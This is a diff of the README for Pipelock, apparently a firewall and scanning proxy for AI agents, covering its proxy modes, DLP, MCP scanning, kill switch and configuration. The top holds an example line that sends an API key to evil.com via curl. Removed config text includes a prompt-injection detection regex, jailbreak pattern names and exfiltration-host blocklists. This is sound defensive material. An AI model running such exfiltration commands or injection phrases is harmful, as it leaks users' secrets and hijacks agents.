@@ -17,14 +17,14 @@
 Your agent has `$ANTHROPIC_API_KEY` in its environment, plus shell access. One request is all it takes:
 
 ```bash
-curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over — unless pipelock is watching
+curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over, unless pipelock is watching
 ```
 
 **Works with:** Claude Code · OpenAI Agents SDK · Google ADK · AutoGen · CrewAI · LangGraph · Cursor
 
 [Quick Start](#quick-start) · [Integration Guides](#integration-guides) · [Docs](docs/) · [Blog](https://pipelab.org/blog/)
 
-![Pipelock demo — DLP blocking, domain blocklist, integrity monitoring](assets/demo.gif)
+![Pipelock demo](assets/demo.gif)
 
 ## Quick Start
 
@@ -42,38 +42,43 @@ docker pull ghcr.io/luckypipewrench/pipelock:latest
 go install github.com/luckyPipewrench/pipelock/cmd/pipelock@latest
 ```
 
-**Try the forward proxy (zero code changes):**
+**Try it in 30 seconds:**
 
 ```bash
-# 1. Generate a config and enable the forward proxy
-pipelock audit . -o pipelock.yaml
+# 1. Generate a config
 pipelock generate config --preset balanced > pipelock.yaml
 
-# 2. Start pipelock
+# 2. This should be BLOCKED (DLP catches the fake API key)
+pipelock check --config pipelock.yaml --url "https://example.com/?key=sk-ant-api03-fake1234567890"
+
+# 3. This should be ALLOWED (clean URL, no secrets)
+pipelock check --config pipelock.yaml --url "https://docs.python.org/3/"
+```
+
+<details>
+<summary>Forward proxy mode (zero code changes, any HTTP client)</summary>
+
+The forward proxy intercepts standard `HTTPS_PROXY` traffic. Enable it in your config, then point any process at pipelock:
+
+```bash
+# Edit pipelock.yaml: set forward_proxy.enabled to true
 pipelock run --config pipelock.yaml
 
-# 3. Point any agent (or any process) at pipelock
 export HTTPS_PROXY=http://127.0.0.1:8888
 export HTTP_PROXY=http://127.0.0.1:8888
 
 # Now every HTTP request flows through pipelock's scanner.
-# This should be blocked (DLP catches the fake API key):
-curl "https://example.com/?key=sk-ant-api03-fake1234567890"
+curl "https://example.com/?key=sk-ant-api03-fake1234567890"  # blocked
 ```
 
 No SDK, no wrapper, no code changes. If the agent speaks HTTP, pipelock scans it.
+
+</details>
 
 <details>
 <summary>Fetch proxy mode (for agents with a dedicated fetch tool)</summary>
 
 ```bash
-# Scan your project and generate a tailored config
-pipelock audit . -o pipelock.yaml
-
-# Verify: both should be blocked (exit code 1 = working correctly)
-pipelock check --config pipelock.yaml --url "https://pastebin.com/raw/abc123"
-pipelock check --config pipelock.yaml --url "https://example.com/?t=sk-ant-api03-fake1234567890"
-
 # Start the proxy (agents connect to localhost:8888/fetch?url=...)
 pipelock run --config pipelock.yaml
 
@@ -101,13 +106,13 @@ gh attestation verify oci://ghcr.io/luckypipewrench/pipelock:<version> --owner l
 
 ## How It Works
 
-Pipelock is an [agent firewall](https://pipelab.org/agent-firewall/): like a WAF for web apps, it sits inline between your AI agent and the internet. It uses **capability separation** -- the agent process (which has secrets) is network-restricted, while Pipelock (which has NO secrets) inspects all traffic through a 9-layer scanner pipeline.
+Pipelock is an [agent firewall](https://pipelab.org/agent-firewall/): like a WAF for web apps, it sits inline between your AI agent and the internet. It uses **capability separation**: the agent process (which has secrets) is network-restricted, while Pipelock (which has NO secrets) inspects all traffic through a 9-layer scanner pipeline.
 
 Three proxy modes, same port:
 
 - **Fetch proxy** (`/fetch?url=...`): Pipelock fetches the URL, extracts text, scans the response for prompt injection, and returns clean content. Best for agents that use a dedicated fetch tool.
-- **Forward proxy** (`HTTPS_PROXY`): Standard HTTP CONNECT tunneling and absolute-URI forwarding. Agents use Pipelock as their system proxy with zero code changes. Hostname scanning catches blocked domains and SSRF before the tunnel opens. Best for agents that use native `fetch()` or HTTP libraries.
-- **WebSocket proxy** (`/ws?url=ws://...`): Upgrades the client connection, dials the upstream WebSocket server through the SSRF-safe dialer, and relays frames bidirectionally. Text frames are scanned through the full DLP + injection pipeline. Fragment reassembly, message size limits, idle timeout, and connection lifetime controls are all built in.
+- **Forward proxy** (`HTTPS_PROXY`): Standard HTTP CONNECT tunneling and absolute-URI forwarding. Agents use Pipelock as their system proxy with zero code changes. Hostname scanning catches blocked domains and SSRF before the tunnel opens.
+- **WebSocket proxy** (`/ws?url=ws://...`): Bidirectional frame scanning with DLP + injection detection on text frames. Fragment reassembly, message size limits, idle timeout, and connection lifetime controls are all built in.
 
 ```mermaid
 flowchart LR
@@ -203,423 +208,105 @@ What each mode prevents, detects, or logs:
 
 ## Features
 
-### Project Audit
+### 9-Layer URL Scanner
 
-Scan any project directory to detect security risks and generate a tailored config:
+Every request passes through: scheme validation, domain blocklist, DLP pattern matching (35 built-in patterns for API keys, tokens, credentials, and injection attempts), path entropy analysis, subdomain entropy analysis, SSRF protection with DNS rebinding prevention, per-domain rate limiting, URL length limits, and per-domain data budgets.
 
-```bash
-pipelock audit ./my-project -o pipelock-suggested.yaml
-```
-
-Detects agent type (Claude Code, Cursor, CrewAI, LangGraph, AutoGen), programming languages, package ecosystems, MCP servers, and secrets in environment variables and config files. Outputs a security score and a suggested config file tuned for your project.
-
-### URL Scanning
-
-Every request passes through a 9-layer scanner pipeline:
-
-1. **Scheme validation** — enforces http/https only
-2. **Domain blocklist** — blocks known exfiltration targets (pastebin, transfer.sh). Pre-DNS.
-3. **DLP patterns** — regex matching for API keys, tokens, and secrets. Includes env variable leak detection (values 16+ chars with entropy > 3.0, raw + base64/hex/base32 encoded) and known-secret file scanning (raw + encoded forms). Pre-DNS to prevent secret exfiltration via DNS queries.
-4. **Path entropy analysis** — Shannon entropy flags encoded/encrypted data in URL path segments
-5. **Subdomain entropy analysis** — flags high-entropy subdomains used for DNS exfiltration
-6. **SSRF protection** — blocks internal/private IPs with DNS rebinding prevention. Post-DNS, safe after DLP.
-7. **Rate limiting** — per-domain sliding window
-8. **URL length limits** — unusually long URLs suggest data exfiltration
-9. **Data budget** — per-domain byte limits prevent slow-drip exfiltration across many requests
+DLP runs before DNS resolution. Secrets are caught before any DNS query leaves the proxy. See [docs/bypass-resistance.md](docs/bypass-resistance.md) for the full evasion test matrix.
 
 ### Response Scanning
 
-Fetched content is scanned for prompt injection before reaching the agent:
+Fetched content is scanned for prompt injection before reaching the agent. A 6-pass normalization pipeline catches zero-width character evasion, homoglyph substitution, leetspeak encoding, and base64-wrapped payloads. Actions: `block`, `strip`, `warn`, or `ask` (human-in-the-loop terminal approval).
 
-- **Prompt injection** — "ignore previous instructions" and variants
-- **System/role overrides** — attempts to hijack system prompts
-- **Jailbreak attempts** — DAN mode, developer mode, etc.
+### MCP Proxy
 
-Actions: `block` (reject entirely), `strip` (redact matched text), `warn` (log and pass through), `ask` (terminal y/N/s prompt with timeout — requires TTY)
-
-### File Integrity Monitoring
+Wraps any MCP server with bidirectional scanning. Three transport modes: stdio subprocess wrapping, Streamable HTTP bridging, and HTTP reverse proxy. Scans both directions: client requests checked for DLP leaks, server responses scanned for injection, and `tools/list` responses checked for poisoned descriptions and mid-session rug-pull changes.
 
 ```bash
-pipelock integrity init ./workspace --exclude "logs/**"
-pipelock integrity check ./workspace         # exit 0 = clean
-pipelock integrity check ./workspace --json  # machine-readable
-pipelock integrity update ./workspace        # re-hash after review
-```
-
-SHA256 manifests detect modified, added, or removed files. See [lateral movement in multi-agent systems](https://pipelab.org/blog/lateral-movement-multi-agent-llm/).
-
-### Git Protection
-
-```bash
-git diff HEAD~1 | pipelock git scan-diff             # scan for secrets in unified diff
-pipelock git install-hooks --config pipelock.yaml     # pre-push hook
-```
-
-Input must be unified diff format (with `+++ b/filename` headers and `+` lines). Plain text won't match.
-
-### Ed25519 Signing
-
-```bash
-pipelock keygen my-bot                         # generate key pair
-pipelock sign manifest.json --agent my-bot     # sign a file
-pipelock verify manifest.json --agent my-bot   # verify signature
-pipelock trust other-bot /path/to/other-bot.pub  # trust a peer
-```
-
-Keys stored under `~/.pipelock/agents/` and `~/.pipelock/trusted_keys/`.
-
-### MCP Proxy + Bidirectional Scanning
-
-Wrap any MCP server as a stdio proxy. Pipelock scans both directions: client requests are checked for DLP leaks and injection in tool arguments, server responses are scanned for prompt injection, and `tools/list` responses are checked for poisoned tool descriptions and rug-pull definition changes:
-
-```bash
-# Wrap a local MCP server (stdio transport)
+# Wrap a local MCP server (stdio)
 pipelock mcp proxy --config pipelock.yaml -- npx -y @modelcontextprotocol/server-filesystem /tmp
 
-# Proxy a remote MCP server (Streamable HTTP transport)
+# Proxy a remote MCP server (HTTP)
 pipelock mcp proxy --upstream http://localhost:8080/mcp
 
-# HTTP reverse proxy (MCP-to-MCP, for server deployments)
-pipelock mcp proxy --listen 0.0.0.0:8889 --upstream http://upstream:3000/mcp
-
-# Combined mode (fetch/forward proxy + MCP listener on separate ports)
+# Combined mode (fetch/forward proxy + MCP on separate ports)
 pipelock run --config pipelock.yaml --mcp-listen 0.0.0.0:8889 --mcp-upstream http://localhost:3000/mcp
-
-# Batch scan (stdin)
-mcp-server | pipelock mcp scan
-pipelock mcp scan --json --config pipelock.yaml < responses.jsonl
 ```
 
-Catches injection split across content blocks. Exit 0 if clean, 1 if injection detected.
+### MCP Tool Policy
 
-### MCP Tool Call Policy
+Pre-execution rules that block dangerous tool calls before they reach MCP servers. Ships with 9 built-in rules covering destructive operations, credential access, reverse shells, and encoded command execution. Shell obfuscation detection is built-in.
 
-Define rules to block or warn before specific tool calls reach MCP servers:
+### Tool Call Chain Detection
 
-```yaml
-mcp_tool_policy:
-  enabled: true
-  action: warn
-  rules:
-    - name: "Block shell execution"
-      tool_pattern: "execute_command|run_terminal"
-      action: block
-    - name: "Warn on sensitive writes"
-      tool_pattern: "write_file"
-      arg_pattern: '/etc/.*|/usr/.*'
-      action: warn
-```
-
-Auto-enabled in proxy mode. Rules are evaluated before tool calls are forwarded.
-
-### WebSocket Proxy
-
-Proxy WebSocket connections through the scanner pipeline. Text frames get DLP and injection scanning; binary frames can be allowed or blocked by policy. The proxy handles fragment reassembly, message size limits, and connection lifecycle:
-
-```bash
-# Enable in config (or use a preset with websocket_proxy.enabled: true)
-pipelock run --config pipelock.yaml
-
-# Agent connects via /ws endpoint
-wscat -c "ws://localhost:8888/ws?url=ws://upstream:9090/stream"
-```
-
-```yaml
-websocket_proxy:
-  enabled: true
-  max_message_bytes: 1048576       # 1MB max per message
-  max_concurrent_connections: 128
-  scan_text_frames: true           # DLP + injection on text frames
-  allow_binary_frames: false       # block binary by default
-  strip_compression: true          # force uncompressed (required for scanning)
-  max_connection_seconds: 3600     # 1h max lifetime
-  idle_timeout_seconds: 300        # 5min idle timeout
-  origin_policy: rewrite           # rewrite, forward, or strip
-  forward_cookies: false           # forward cookies to upstream
-```
-
-Features:
-- Full 9-layer scanner pipeline on target URL before connecting
-- DLP + injection scanning on text frame content (both directions)
-- Fragment reassembly with per-message size limits
-- Auth header forwarding with DLP scanning (Authorization, Cookie when enabled)
-- SSRF-safe upstream dialer (same DNS-pinning as forward proxy)
-- Prometheus metrics: `pipelock_ws_connections_total`, `pipelock_ws_active_connections`, `pipelock_ws_frames_total`, `pipelock_ws_scan_hits_total`
-- Structured audit logs for open/close/blocked events
+Detects attack patterns in sequences of MCP tool calls. Ships with 8 built-in patterns covering reconnaissance, credential theft, data staging, and exfiltration chains. Uses subsequence matching with configurable gap tolerance, so inserting innocent calls between attack steps doesn't evade detection.
 
 ### Kill Switch
 
-Emergency deny-all that blocks every request through the proxy. Four activation sources, OR-composed — any one active means all traffic is blocked:
-
-| Source | How to activate | How to deactivate |
-|--------|----------------|-------------------|
-| **Config** | `kill_switch.enabled: true` | Set to `false` and SIGHUP |
-| **Signal** | `kill -SIGUSR1 <pid>` | `kill -SIGUSR1 <pid>` (toggles) |
-| **Sentinel file** | `touch /tmp/pipelock-kill` | `rm /tmp/pipelock-kill` |
-| **API** | `POST /api/v1/killswitch` with `{"active": true}` | `POST /api/v1/killswitch` with `{"active": false}` |
-
-The API requires a bearer token (`api_token` in config). Health endpoint (`/health`) always reports kill switch status — no auth needed.
-
-**Port isolation**: Set `api_listen` to run the API on a separate port. This prevents agents from deactivating their own kill switch — the agent's traffic goes through the main proxy port and cannot reach the API. Recommended for sidecar deployments:
-
-```yaml
-kill_switch:
-  enabled: false
-  api_listen: "0.0.0.0:9090"    # Separate port — not exposed via k8s Service
-  api_token: "CHANGE-ME"
-  sentinel_file: /tmp/pipelock-kill
-  message: "Emergency deny-all active"
-```
+Emergency deny-all with four independent activation sources: config file, SIGUSR1, sentinel file, and remote API. Any one active blocks all traffic. The API can run on a separate port so agents can't deactivate their own kill switch.
 
 ```bash
-# Activate from operator machine (agent cannot reach this port)
+# Activate from operator machine
 curl -X POST http://localhost:9090/api/v1/killswitch \
-  -H "Authorization: Bearer TOKEN" \
-  -d '{"active": true}'
-
-# Check status (shows all four sources)
-curl http://localhost:9090/api/v1/killswitch/status \
-  -H "Authorization: Bearer TOKEN"
+  -H "Authorization: Bearer TOKEN" -d '{"active": true}'
 ```
 
 ### Event Emission
 
-Forward audit events to external systems (SIEM, webhook receivers, syslog servers). Events are fire-and-forget — emission never blocks the proxy. Two independent sinks, each with its own severity filter:
+Forward audit events to external systems (SIEM, webhook receivers, syslog). Events are fire-and-forget and never block the proxy. Each event includes a MITRE ATT&CK technique ID where applicable (T1048 for exfiltration, T1059 for injection, T1195.002 for supply chain).
 
-```yaml
-emit:
-  instance_id: "prod-agent-1"     # Identifies this pipelock instance in events
-  webhook:
-    url: "https://your-siem.example.com/webhook"
-    min_severity: warn             # info, warn, critical
-    auth_token: "CHANGE-ME"
-    timeout_seconds: 5
-    queue_size: 64
-  syslog:
-    address: "udp://syslog.example.com:514"
-    min_severity: warn
-    facility: local0
-    tag: pipelock
-```
+See [docs/guides/siem-integration.md](docs/guides/siem-integration.md) for log schema, forwarding patterns, and example SIEM queries.
 
-Severity levels are hardcoded per event type — users control the emission threshold, not the severity:
-- **critical**: kill switch deny, adaptive escalation to block
-- **warn**: blocked requests, anomalies, session anomalies, MCP unknown tools, response scan hits, WebSocket blocked/scan hits, errors
-- **info**: allowed requests, forward proxy HTTP, tunnel open/close, WebSocket open/close, config reload, redirects
+### More Features
 
-### Finding Suppression
+| Feature | What It Does |
+|---------|-------------|
+| **Project Audit** | `pipelock audit ./project` scans for security risks and generates a tailored config |
+| **File Integrity** | SHA256 manifests detect modified, added, or removed workspace files |
+| **Git Protection** | `git diff \| pipelock git scan-diff` catches secrets before they're committed |
+| **Ed25519 Signing** | Key management, file signing, and signature verification for multi-agent trust |
+| **Session Profiling** | Per-session behavioral analysis (domain bursts, volume spikes) |
+| **Adaptive Enforcement** | Threat score accumulation with automatic escalation |
+| **Finding Suppression** | Silence known false positives via config rules or inline `pipelock:ignore` comments |
+| **Multi-Agent Support** | Agent identification via `X-Pipelock-Agent` header for per-agent filtering |
+| **Fleet Monitoring** | Prometheus metrics + ready-to-import [Grafana dashboard](configs/grafana-dashboard.json) |
 
-Suppress specific scanner findings when you know they're false positives. Two methods:
-
-```yaml
-# Config-level suppression
-suppress:
-  - rule: "Jailbreak Attempt"
-    path: "*/robots.txt"
-    reason: "robots.txt content triggers developer mode regex"
-```
-
-Inline suppression via `// pipelock:ignore` comments in source files (used by `pipelock audit` and `pipelock git scan-diff`).
-
-See [Finding Suppression Guide](docs/guides/suppression.md) for the full reference: all rule names, path matching styles, `--exclude` flag, and GitHub Action integration.
-
-### Tool Call Chain Detection
-
-Detects attack patterns in sequences of MCP tool calls. Ships with 8 built-in patterns covering reconnaissance, credential theft, data staging, and exfiltration chains:
-
-```yaml
-tool_chain_detection:
-  enabled: true
-  action: warn              # warn or block
-  window_size: 20           # max tool calls in history
-  window_seconds: 300       # time-based eviction
-  max_gap: 3                # max innocent calls between chain steps
-```
-
-### Multi-Agent Support
-
-Each agent identifies itself via `X-Pipelock-Agent` header (or `?agent=` query parameter). All audit logs include the agent name for per-agent filtering.
-
-```bash
-curl -H "X-Pipelock-Agent: my-bot" "http://localhost:8888/fetch?url=https://example.com"
-```
-
-### Fleet Monitoring
-
-Built-in Prometheus metrics with a ready-to-import [Grafana dashboard](configs/grafana-dashboard.json). Covers all 20 metrics across connections, security events, WebSocket proxy, and session profiling.
-
-![Pipelock Fleet Monitor — Grafana dashboard showing 4 agents with traffic, security events, and WebSocket metrics](docs/assets/fleet-dashboard.jpg)
-
-See [docs/metrics.md](docs/metrics.md) for the full metrics reference and [examples/prometheus/pipelock-alerts.yaml](examples/prometheus/pipelock-alerts.yaml) for alert rule templates.
 
 ## Configuration
 
-```yaml
-version: 1
-mode: balanced
-enforce: true              # set false for audit mode (log without blocking)
+Generate a starter config, or use one of the 6 presets:
 
-api_allowlist:
-  - "*.anthropic.com"
-  - "*.openai.com"
-  - "*.discord.com"
-  - "github.com"
-
-fetch_proxy:
-  listen: "127.0.0.1:8888"
-  timeout_seconds: 30
-  max_response_mb: 10
-  user_agent: "Pipelock Fetch/1.0"
-  monitoring:
-    entropy_threshold: 4.5
-    max_url_length: 2048
-    max_requests_per_minute: 60
-    blocklist:
-      - "*.pastebin.com"
-      - "*.transfer.sh"
-
-dlp:
-  scan_env: true
-  secrets_file: "./known-secrets.txt"  # optional: one secret per line, scanned in raw + encoded forms
-  patterns:
-    - name: "Anthropic API Key"
-      regex: 'sk-ant-[a-zA-Z0-9\-_]{10,}'
-      severity: critical
-    - name: "AWS Access ID"
-      regex: '(AKIA|A3T|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16,}'
-      severity: critical
-    # ... 20 more patterns ship by default (see configs/balanced.yaml)
-
-response_scanning:
-  enabled: true
-  action: warn               # block, strip, warn, or ask (HITL)
-  patterns:
-    - name: "Prompt Injection"
-      regex: '(?i)(ignore|disregard)\s+(all\s+)?(previous|prior)\s+(instructions|prompts)'
-
-mcp_input_scanning:
-  enabled: true
-  action: warn               # block or warn (auto-enabled for mcp proxy)
-  on_parse_error: block      # block or forward
-
-mcp_tool_scanning:
-  enabled: true
-  action: warn               # block or warn (auto-enabled for mcp proxy)
-  detect_drift: true         # alert on tool description changes mid-session
-
-# mcp_tool_policy:           # pre-execution tool call policy (see "MCP Tool Call Policy" above)
-#   enabled: true
-#   action: warn
-#   rules: []
-
-forward_proxy:
-  enabled: false             # enable to accept CONNECT tunnels and absolute-URI requests
-  max_tunnel_seconds: 300    # max lifetime per tunnel
-  idle_timeout_seconds: 120  # kill idle tunnels after this
-
-websocket_proxy:
-  enabled: false             # enable /ws WebSocket proxy endpoint
-  max_message_bytes: 1048576 # 1MB max per assembled message
-  max_concurrent_connections: 128
-  scan_text_frames: true     # DLP + injection scanning on text frames
-  allow_binary_frames: false # block binary frames by default
-  strip_compression: true    # force uncompressed (required for frame scanning)
-  max_connection_seconds: 3600
-  idle_timeout_seconds: 300
-  origin_policy: rewrite     # rewrite, forward, or strip Origin header
-  forward_cookies: false     # forward cookies to upstream
-
-# Finding suppression — silence known false positives
-# suppress:
-#   - rule: "Jailbreak Attempt"
-#     path: "*/robots.txt"
-#     reason: "robots.txt content triggers developer mode regex"
-
-# Kill switch — emergency deny-all (see "Kill Switch" section above)
-# kill_switch:
-#   enabled: false
-#   api_listen: "0.0.0.0:9090"  # separate port for operator-only API access
-#   api_token: ""                # set a bearer token to enable the API
-#   sentinel_file: /tmp/pipelock-kill
-#   message: "Emergency deny-all active"
-
-# Event emission — forward audit events to external systems
-# emit:
-#   instance_id: ""              # defaults to hostname
-#   webhook:
-#     url: "https://your-siem.example.com/webhook"
-#     min_severity: warn
-#     auth_token: ""
-#     timeout_seconds: 5
-#     queue_size: 64
-#   syslog:
-#     address: "udp://syslog.example.com:514"
-#     min_severity: warn
-#     facility: local0
-#     tag: pipelock
-
-# Tool call chain detection (MCP)
-# tool_chain_detection:
-#   enabled: true
-#   action: warn
-#   window_size: 20
-#   window_seconds: 300
-#   max_gap: 3
-
-# Session behavioral profiling
-# session_profiling:
-#   enabled: true
-
-# Adaptive enforcement (scoring-only in v1)
-# adaptive_enforcement:
-#   enabled: true
-
-logging:
-  format: json
-  output: stdout
-  include_allowed: true
-  include_blocked: true
-
-internal:
-  - "0.0.0.0/8"
-  - "127.0.0.0/8"
-  - "10.0.0.0/8"
-  - "100.64.0.0/10"
-  - "172.16.0.0/12"
-  - "192.168.0.0/16"
-  - "169.254.0.0/16"
-  - "::1/128"
-  - "fc00::/7"
-  - "fe80::/10"
-
-git_protection:
-  enabled: false
-  allowed_branches: ["feature/*", "fix/*", "main"]
-  pre_push_scan: true
+```bash
+pipelock generate config --preset balanced > pipelock.yaml
+pipelock audit ./my-project -o pipelock.yaml  # tailored to your project
 ```
-
-### Presets
 
 | Preset | Mode | Action | Best For |
 |--------|------|--------|----------|
 | `configs/balanced.yaml` | balanced | warn | General purpose |
-| `configs/strict.yaml` | strict | block | High-security environments |
+| `configs/strict.yaml` | strict | block | High-security |
 | `configs/audit.yaml` | audit | warn | Log-only monitoring |
 | `configs/claude-code.yaml` | balanced | block | Claude Code (unattended) |
-| `configs/cursor.yaml` | balanced | block | Cursor IDE (unattended) |
-| `configs/generic-agent.yaml` | balanced | warn | New agents (tuning phase) |
+| `configs/cursor.yaml` | balanced | block | Cursor IDE |
+| `configs/generic-agent.yaml` | balanced | warn | New agents (tuning) |
+
+Config changes are picked up automatically via file watcher or SIGHUP (most fields hot-reload without restart).
+
+Full reference with all fields, defaults, and hot-reload behavior: **[docs/configuration.md](docs/configuration.md)**
 
 ## Integration Guides
 
-- **[Claude Code](docs/guides/claude-code.md)** — MCP proxy setup, `.claude.json` configuration, HTTP fetch proxy hooks
-- **[OpenAI Agents SDK](docs/guides/openai-agents.md)** — `MCPServerStdio`, multi-agent handoffs, Docker Compose
-- **[Google ADK](docs/guides/google-adk.md)** — `McpToolset`, `StdioConnectionParams`, sub-agents
-- **[AutoGen](docs/guides/autogen.md)** — `StdioServerParams`, `mcp_server_tools()`, multi-agent teams
-- **[CrewAI](docs/guides/crewai.md)** — `MCPServerStdio` wrapping, `MCPServerAdapter`, Docker Compose
-- **[LangGraph](docs/guides/langgraph.md)** — `MultiServerMCPClient`, `StateGraph`, Docker deployment
-- Cursor — use `configs/cursor.yaml` with the same MCP proxy pattern as [Claude Code](docs/guides/claude-code.md)
+- **[Claude Code](docs/guides/claude-code.md):** MCP proxy setup, `.claude.json` configuration
+- **[OpenAI Agents SDK](docs/guides/openai-agents.md):** `MCPServerStdio`, multi-agent handoffs
+- **[Google ADK](docs/guides/google-adk.md):** `McpToolset`, `StdioConnectionParams`
+- **[AutoGen](docs/guides/autogen.md):** `StdioServerParams`, `mcp_server_tools()`
+- **[CrewAI](docs/guides/crewai.md):** `MCPServerStdio` wrapping, `MCPServerAdapter`
+- **[LangGraph](docs/guides/langgraph.md):** `MultiServerMCPClient`, `StateGraph`
+- **Cursor:** use `configs/cursor.yaml` with the same MCP proxy pattern as [Claude Code](docs/guides/claude-code.md)
 
-## GitHub Action
+## CI Integration
+
+### GitHub Action
 
 Scan your project for agent security risks on every PR. No Go toolchain needed.
 
@@ -631,48 +318,40 @@ Scan your project for agent security risks on every PR. No Go toolchain needed.
     fail-on-findings: 'true'
 ```
 
-The action downloads a pre-built binary, runs `pipelock audit` on your project, scans the PR diff for leaked secrets, and uploads the audit report as a workflow artifact. Critical findings produce GitHub annotations inline on the PR diff.
+The action downloads a pre-built binary, runs `pipelock audit` on your project, scans the PR diff for leaked secrets, and uploads the audit report as a workflow artifact. Critical findings produce inline annotations on the PR diff.
 
-**With a config file:**
+See [`examples/ci-workflow.yaml`](examples/ci-workflow.yaml) for a complete workflow.
+
+### Reusable Workflow
+
+For even simpler adoption, call the reusable workflow directly:
 
 ```yaml
-- uses: luckyPipewrench/pipelock@v0.3.0
-  with:
-    config: pipelock.yaml
-    test-vectors: 'true'
+# .github/workflows/security.yaml
+jobs:
+  pipelock:
+    uses: luckyPipewrench/pipelock/.github/workflows/reusable-scan.yml@v1
+    with:
+      fail-on-critical: true
 ```
 
-See [`examples/ci-workflow.yaml`](examples/ci-workflow.yaml) for a complete workflow, or [`examples/ci-workflow-advanced.yaml`](examples/ci-workflow-advanced.yaml) for security score reporting in the job summary.
+That's the entire workflow. Everything else is defaults: auto-generated config, PR diff scanning, artifact upload.
 
-| Input | Default | Description |
-|-------|---------|-------------|
-| `version` | `latest` | Pipelock version to download |
-| `config` | *(none)* | Path to config file (auto-generates if not set) |
-| `directory` | `.` | Directory to scan |
-| `scan-diff` | `true` | Scan PR diff for leaked secrets |
-| `fail-on-findings` | `true` | Fail if critical findings detected |
-| `test-vectors` | `true` | Validate scanning coverage with built-in tests |
-| `exclude-paths` | *(none)* | Paths to exclude from findings (one per line, supports globs) |
-
-## Docker
+## Deployment
 
 ```bash
-# Pull from GHCR
+# Docker
 docker pull ghcr.io/luckypipewrench/pipelock:latest
 docker run -p 8888:8888 -v ./pipelock.yaml:/config/pipelock.yaml:ro \
   ghcr.io/luckypipewrench/pipelock:latest \
   run --config /config/pipelock.yaml --listen 0.0.0.0:8888
-
-# Build locally
-docker build -t pipelock .
-docker run -p 8888:8888 pipelock
 
 # Network-isolated agent (Docker Compose)
 pipelock generate docker-compose --agent claude-code -o docker-compose.yaml
 docker compose up
 ```
 
-The generated compose file creates two containers: **pipelock** (firewall with internet access) and **agent** (your AI agent on an internal-only network, can only reach pipelock).
+For production deployment recipes (Docker Compose with network isolation, Kubernetes sidecar + NetworkPolicy, iptables/nftables, macOS PF): **[docs/guides/deployment-recipes.md](docs/guides/deployment-recipes.md)**
 
 <details>
 <summary>API Reference</summary>
@@ -683,10 +362,10 @@ curl "http://localhost:8888/fetch?url=https://example.com"
 
 # Forward proxy (when forward_proxy.enabled: true)
 # Set HTTPS_PROXY=http://localhost:8888 and use any HTTP client normally.
-# HTTPS goes through CONNECT tunnels; plain HTTP uses absolute-URI forwarding.
+curl -x http://localhost:8888 https://example.com
+
 # WebSocket proxy (when websocket_proxy.enabled: true)
 # wscat -c "ws://localhost:8888/ws?url=ws://upstream:9090/path"
-curl -x http://localhost:8888 https://example.com
 
 # Health check
 curl "http://localhost:8888/health"
@@ -698,10 +377,8 @@ curl "http://localhost:8888/metrics"
 curl "http://localhost:8888/stats"
 
 # Kill switch API (when api_listen is set, use that port instead)
-# Activate:
 curl -X POST http://localhost:9090/api/v1/killswitch \
   -H "Authorization: Bearer TOKEN" -d '{"active": true}'
-# Status:
 curl http://localhost:9090/api/v1/killswitch/status \
   -H "Authorization: Bearer TOKEN"
 ```
@@ -726,35 +403,9 @@ curl http://localhost:9090/api/v1/killswitch/status \
   "version": "x.y.z",
   "mode": "balanced",
   "uptime_seconds": 3600.5,
-  "dlp_patterns": 22,
+  "dlp_patterns": 35,
   "response_scan_enabled": true,
-  "git_protection_enabled": false,
-  "rate_limit_enabled": true,
-  "forward_proxy_enabled": false,
-  "websocket_proxy_enabled": false,
   "kill_switch_active": false
-}
-```
-
-**Stats response:**
-```json
-{
-  "uptime_seconds": 3600.5,
-  "requests": {
-    "total": 150,
-    "allowed": 142,
-    "blocked": 8,
-    "block_rate": 0.053
-  },
-  "tunnels": 42,
-  "top_blocked_domains": [
-    {"name": "pastebin.com", "count": 5},
-    {"name": "transfer.sh", "count": 3}
-  ],
-  "top_scanners": [
-    {"name": "blocklist", "count": 5},
-    {"name": "dlp", "count": 3}
-  ]
 }
 ```
 
@@ -765,54 +416,71 @@ curl http://localhost:9090/api/v1/killswitch/status \
 
 | Threat | Coverage |
 |--------|----------|
-| ASI01 Agent Goal Hijack | **Strong** - bidirectional MCP + response scanning |
-| ASI02 Tool Misuse | **Partial** - proxy as controlled tool, MCP scanning |
-| ASI03 Identity & Privilege Abuse | **Strong** - capability separation + SSRF protection |
-| ASI04 Supply Chain Vulnerabilities | **Partial** - integrity monitoring + MCP scanning |
-| ASI05 Unexpected Code Execution | **Moderate** - HITL approval, fail-closed defaults |
-| ASI06 Memory & Context Poisoning | **Moderate** - injection detection on fetched content |
-| ASI07 Insecure Inter-Agent Communication | **Partial** - agent ID, integrity, signing |
-| ASI08 Cascading Failures | **Moderate** - fail-closed architecture, rate limiting |
-| ASI09 Human-Agent Trust Exploitation | **Partial** - HITL modes, audit logging |
-| ASI10 Rogue Agents | **Strong** - domain allowlist + rate limiting + capability separation |
+| ASI01 Agent Goal Hijack | **Strong:** bidirectional MCP + response scanning |
+| ASI02 Tool Misuse | **Partial:** proxy as controlled tool, MCP scanning |
+| ASI03 Identity & Privilege Abuse | **Strong:** capability separation + SSRF protection |
+| ASI04 Supply Chain Vulnerabilities | **Partial:** integrity monitoring + MCP scanning |
+| ASI05 Unexpected Code Execution | **Moderate:** HITL approval, fail-closed defaults |
+| ASI06 Memory & Context Poisoning | **Moderate:** injection detection on fetched content |
+| ASI07 Insecure Inter-Agent Communication | **Partial:** agent ID, integrity, signing |
+| ASI08 Cascading Failures | **Moderate:** fail-closed architecture, rate limiting |
+| ASI09 Human-Agent Trust Exploitation | **Partial:** HITL modes, audit logging |
+| ASI10 Rogue Agents | **Strong:** domain allowlist + rate limiting + capability separation |
 
 Details, config examples, and gap analysis: [docs/owasp-mapping.md](docs/owasp-mapping.md)
 
 </details>
 
+## Docs
+
+| Document | What's In It |
+|----------|-------------|
+| [Configuration Reference](docs/configuration.md) | All config fields, defaults, hot-reload behavior, presets |
+| [Deployment Recipes](docs/guides/deployment-recipes.md) | Docker Compose, K8s sidecar + NetworkPolicy, iptables, macOS PF |
+| [Bypass Resistance](docs/bypass-resistance.md) | Known evasion techniques, mitigations, and honest limitations |
+| [Known Attacks Blocked](docs/attacks-blocked.md) | Real attacks with repro snippets and pipelock config that stops them |
+| [Policy Spec v0.1](docs/policy-spec-v0.1.md) | Portable agent firewall policy format |
+| [SIEM Integration](docs/guides/siem-integration.md) | Log schema, forwarding patterns, KQL/SPL/EQL queries |
